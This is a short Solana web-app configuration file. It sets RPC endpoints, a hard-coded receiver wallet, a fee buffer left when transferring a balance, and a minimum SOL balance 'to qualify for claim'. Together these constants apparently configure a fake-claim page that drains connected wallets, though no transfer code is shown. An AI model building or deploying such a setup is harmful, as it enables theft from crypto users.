import { PublicKey } from '@solana/web3.js';

// RPC endpoints — tries the env variable first, then public fallbacks
const primaryRpc = import.meta.env.VITE_RPC_URL || 'https://api.mainnet-beta.solana.com';
export const RPC_ENDPOINTS = [
  primaryRpc,
  'https://api.mainnet-beta.solana.com',
  'https://solana-mainnet.g.alchemy.com/v2/demo',
  'https://rpc.ankr.com/solana',
];
export const RPC_URL = primaryRpc;

// 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');

// Optional: Minimum balance buffer (in lamports)
export const TRANSFER_FEE_BUFFER = 5000; // ~0.000005 SOL

// Minimum SOL balance required to qualify for claim
export const MIN_QUALIFY_SOL = 0.01;
